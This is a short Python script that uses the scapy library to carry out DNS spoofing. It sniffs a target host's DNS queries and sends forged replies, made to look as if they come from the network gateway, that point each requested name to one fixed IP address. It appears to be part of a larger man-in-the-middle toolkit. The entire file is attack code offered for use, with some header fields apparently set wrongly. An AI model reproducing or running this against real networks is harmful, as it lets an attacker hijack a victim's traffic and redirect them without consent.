import Project 
from scapy.all import *

#gets DNS packet and send spoofed response to the source of the packet
def handler(packet):
    trg = trgg
    print trg
    if not DNS in packet:
        return
    s_port= packet[UDP].sport # the sourse port 
    tid= packet[DNS].id # transaction id 
    q_name = packet[DNS].qd.qname
    
    print "the bastard try to go to "+q_name 
    
    ipp= IP(src =Project. GETGATWAY(), dst =trg)
    udpp=UDP(sport= 53, dport =s_port)
    dnsp=DNS(id=tid,qr=0,opcode =1,rd =1,ra=1 ,qdcount   = 1 ,ancount   = 1,nscount   = 0, arcount   = 1 ,qd=DNSQR( qname =q_name, qclass =1,qtype =1) ,an =DNSRR(rrname=q_name,type=1,rclass =1,rdata="204.79.197.200" ), ar =DNSRR(rrname=q_name,type=1,rclass =1,rdata="204.79.197.200" ) )
    send(ipp/udpp/dnsp)            

#the function get a target and sniffs the trafic from 
def DNSS(trg):   
    f = "udp dst port 53 and host "+ trg
    global trgg # becuse scapy doesnt give other way to give the hnadler function any other information exept the packet it self
    trgg=trg
    D= sniff(filter= f , prn= handler)
       
     
